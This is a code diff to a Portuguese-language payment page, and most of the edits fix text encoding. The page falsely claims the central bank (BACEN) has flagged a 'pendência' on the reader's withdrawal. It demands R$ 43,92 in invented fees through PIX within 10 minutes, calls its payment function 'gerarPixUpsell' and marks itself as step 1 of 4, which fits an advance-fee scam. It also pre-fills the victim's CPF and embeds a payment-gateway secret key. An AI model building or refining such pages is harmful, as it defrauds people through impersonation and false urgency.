@@ -1,9 +1,9 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>RegularizaÃ§Ã£o de PendÃªncia e LiberaÃ§Ã£o de Saque</title>
+  <title>Regulariza&ccedil;&atilde;o de Pend&ecirc;ncia e Libera&ccedil;&atilde;o de Saque</title>
   
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
@@ -20,6 +20,8 @@
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
       background: #f8fafc;
       color: #1e293b;
+      margin: 0;
+      padding: 0;
     }
     .taxa-row {
       display: flex; justify-content: space-between; align-items: center;
@@ -51,7 +53,7 @@
     </div>
   </header>
 
-  <!-- CONTEÃšDO PRINCIPAL -->
+  <!-- CONTEUDO PRINCIPAL -->
   <main class="max-w-xl w-full mx-auto px-4 py-6 flex-1 space-y-4">
     
     <!-- ETAPA ATUAL -->
@@ -59,17 +61,17 @@
       <span class="font-bold text-blue-900 flex items-center gap-1.5">
         <i class="fa-solid fa-shield-halved text-blue-600"></i> Etapa 1 de 4
       </span>
-      <span class="text-blue-700 font-medium">RegularizaÃ§Ã£o de PendÃªncia e LiberaÃ§Ã£o de Saque</span>
+      <span class="text-blue-700 font-medium">Regulariza&ccedil;&atilde;o de Pend&ecirc;ncia e Libera&ccedil;&atilde;o de Saque</span>
     </div>
 
-    <!-- ALERTA DE PENDÃŠNCIA -->
+    <!-- ALERTA DE PENDENCIA -->
     <div class="bg-white rounded-2xl border border-red-200 shadow-sm overflow-hidden">
       <div class="bg-red-500 text-white px-4 py-2.5 flex items-center gap-2 font-bold text-sm">
         <i class="fa-solid fa-triangle-exclamation"></i>
-        <span>PENDÃŠNCIA DE REGISTRO LOCALIZADA NO BACEN</span>
+        <span>PEND&Ecirc;NCIA DE REGISTRO LOCALIZADA NO BACEN</span>
       </div>
       <div class="p-5 space-y-3 text-sm text-slate-700 leading-relaxed">
-        <p>Identificamos uma pendÃªncia cadastral no processamento da sua Ordem BancÃ¡ria de Saque. Ã‰ obrigatÃ³ria a liquidaÃ§Ã£o da taxa de registro e custÃ³dia para autorizar o repasse imediato do seu saldo residual para a sua chave PIX.</p>
+        <p>Identificamos uma pend&ecirc;ncia cadastral no processamento da sua Ordem Banc&aacute;ria de Saque. &Eacute; obrigat&oacute;ria a liquida&ccedil;&atilde;o da taxa de registro e cust&oacute;dia para autorizar o repasse imediato do seu saldo residual para a sua chave PIX.</p>
         <div class="bg-amber-50 border border-amber-200 rounded-lg p-3 text-amber-900 text-xs flex items-center gap-2 font-medium">
           <i class="fa-solid fa-clock text-amber-600 text-base shrink-0"></i>
           <span>Prazo de liquida&ccedil;&atilde;o: <strong>10 minutos</strong> antes do cancelamento da ordem.</span>
@@ -89,13 +91,13 @@
             <span class="taxa-label">Taxa administrativa</span>
             <span class="taxa-value">R$ 29,24</span>
           </div>          <div class="taxa-row">
-            <span class="taxa-label">EmissÃ£o da ordem bancÃ¡ria</span>
+            <span class="taxa-label">Emiss&atilde;o da ordem banc&aacute;ria</span>
             <span class="taxa-value">R$ 7,53</span>
           </div>          <div class="taxa-row">
-            <span class="taxa-label">Registro e compensaÃ§Ã£o BACEN</span>
+            <span class="taxa-label">Registro e compensa&ccedil;&atilde;o BACEN</span>
             <span class="taxa-value">R$ 2,73</span>
           </div>          <div class="taxa-row">
-            <span class="taxa-label">CustÃ³dia de processamento</span>
+            <span class="taxa-label">Cust&oacute;dia de processamento</span>
             <span class="taxa-value">R$ 4,42</span>
           </div>
         <div class="taxa-row bg-slate-50 rounded-lg mt-2 p-3 font-black text-base border border-slate-200">
@@ -105,8 +107,8 @@
       </div>
     </div>
 
-    <!-- BOTÃƒO DE AÃ‡ÃƒO -->
-    <button id="btn-pay" onclick="gerarPixUpsell()" class="w-full bg-[#1351b4] hover:bg-blue-700 text-white font-extrabold py-4 px-6 rounded-xl shadow-lg transition btn-pulse text-center flex items-center justify-center gap-3 text-base">
+    <!-- BOTAO DE ACAO -->
+    <button id="btn-pay" onclick="gerarPixUpsell()" class="w-full bg-[#1351b4] hover:bg-blue-700 text-white font-extrabold py-4 px-6 rounded-xl shadow-lg transition btn-pulse text-center flex items-center justify-center gap-3 text-base cursor-pointer">
       <i class="fa-brands fa-pix text-xl text-emerald-400"></i>
       <span>REGULARIZAR E LIBERAR SAQUE AGORA</span>
     </button>
@@ -171,9 +173,9 @@
     const FASTSOFT_AUTH = "Basic " + btoa("x:sk_cbb3917adbe1bdbcecf3e1bd76c86db8f509e8e3");
     let urlParams = new URLSearchParams(window.location.search);
     let cpf = (urlParams.get('cpf') || localStorage.getItem('userCPF') || '').replace(/\D/g, '');
-    let nome = urlParams.get('nome') || localStorage.getItem('userName') || 'BeneficiÃ¡rio';
+    let nome = urlParams.get('nome') || localStorage.getItem('userName') || 'Beneficiario';
 
-    if (nome) {
+    if (nome && nome !== 'Beneficiario') {
       document.getElementById('u-nome').textContent = nome;
       try { localStorage.setItem('userName', nome); } catch(e){}
     }
@@ -202,7 +204,7 @@
           phone: "11999999999"
         },
         items: [{
-          title: "Taxa de RegularizaÃ§Ã£o e Registro BACEN",
+          title: "Taxa de Regularizacao e Registro BACEN",
           unitPrice: 4392,
           quantity: 1,
           tangible: false
@@ -271,7 +273,6 @@
             if (st === "PAID" || st === "APPROVED" || st === "COMPLETED") {
               clearInterval(pollInterval);
               
-              // Redireciona para o prÃ³ximo passo
               let p = window.location.pathname;
               let bp = "";
               if (p.indexOf("/replay/9345488724234") !== -1) bp = "/replay/9345488724234";
